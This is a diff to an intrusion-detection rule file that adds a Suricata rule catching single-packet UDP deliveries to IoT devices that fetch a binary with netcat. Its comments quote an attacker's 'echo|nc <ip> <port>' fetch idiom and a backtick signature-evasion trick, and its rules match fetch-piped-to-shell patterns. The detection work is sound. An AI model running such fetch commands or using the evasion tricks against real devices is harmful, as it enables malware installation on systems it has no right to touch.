@@ -47,6 +47,18 @@ alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Pa
 
 alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Fetch Piped To Shell"; flow:to_server; dsize:40<>1500; content:"http"; nocase; content:"|7c|sh"; distance:0; within:256; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0002, mitre_technique_id T1059, delivery_class single_packet_udp, created_at 2026_09_20; sid:1000006; rev:1;)
 
+# Netcat fetch. Not every delivery uses an HTTP downloader: geico's ppppl3
+# path is "echo|nc <ip> <port> > a$$", pulling a raw ELF straight off a TCP
+# port with no HTTP at any stage, so none of the verb rules above see it.
+# Measured 2026-09-20: that payload was matched by 1000005 alone, and only
+# because it also chmods - a netcat fetch without a chmod would have been
+# missed entirely.
+#
+# Anchored on the "|nc" pipe idiom rather than a bare "nc", which is two
+# bytes and far too weak to prefilter on. "busybox nc" is already covered by
+# 1000004.
+alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Netcat Fetch"; flow:to_server; dsize:40<>1500; content:"|7c|nc"; nocase; pcre:"/\|\s*nc\s+(-\w+\s+)*\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\s+\d{2,5}\b/i"; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0001, mitre_technique_id T1105, delivery_class single_packet_udp, created_at 2026_09_20; sid:1000008; rev:1;)
+
 # Doubled backtick is deliberate signature evasion - the shell collapses an
 # empty command substitution, so `` inside a filename splits the literal
 # string a naive content match would look for. Seen in RondoDox droppers.
